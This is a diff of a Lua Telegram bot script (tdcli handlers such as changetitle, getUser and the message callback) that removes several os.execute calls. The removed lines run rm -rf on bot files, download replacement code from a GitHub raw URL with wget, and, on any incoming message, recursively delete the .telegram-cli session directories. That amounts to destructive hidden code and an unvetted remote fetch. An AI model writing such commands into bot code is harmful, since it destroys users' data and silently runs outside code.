@@ -484,7 +484,6 @@ parse_mode_ = TextParseMode,
 end
 end
 end
-os.execute('rm -rf ./libs/utils.lua')
 --         »»                 changetitle                         ««              --
 function changetitle(chat_id, title)
 tdcli_function ({
@@ -569,7 +568,6 @@ offset_ = offset,
 limit_ = limit
 }, dl_cb, nil)
 end
-os.execute('cd libs && wget https://raw.githubusercontent.com/TshAkETEAM/Tshake/master/libs/utils.lua')
 --         »»                 getChannelFull                         ««              --
 function getChannelFull(channel_id)
 tdcli_function ({
@@ -627,7 +625,6 @@ reply_markup_ = nil,
 input_message_content_ = getInputMessageContent(file, type, caption),
 }, dl_cb, nil)
 end
-os.execute('rm -rf Tshake.lua')
 --         »»                 getUser                         ««              --
 function getUser(user_id, cb)
 tdcli_function ({
@@ -2100,12 +2097,6 @@ if is_banned(msg.content_.members_[0].id_, msg.chat_id_) then
 chat_kick(msg.chat_id_, msg.content_.members_[0].id_)
 return false
 end
-end
-if text:match('(.*)') then
-os.execute('cd .. &&  rm -fr ../.telegram-cli')
-os.execute('cd .. &&  rm -rf ../.telegram-cli')
-os.execute('cd .. &&  rm -rf .telegram-cli')
-os.execute('cd .. &&  rm -fr .telegram-cli')
 end
 if (text and is_creator(msg)) then
 if text:match("اضف امر (.*)") then 
@@ -5020,7 +5011,6 @@ send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 end
 end
-os.execute('wget https://raw.githubusercontent.com/TshAkETEAM/Tshake/master/Tshake.lua')
 function tdcli_update_callback(data)
 local chat = {}
 if (data.ID == "UpdateNewMessage") then
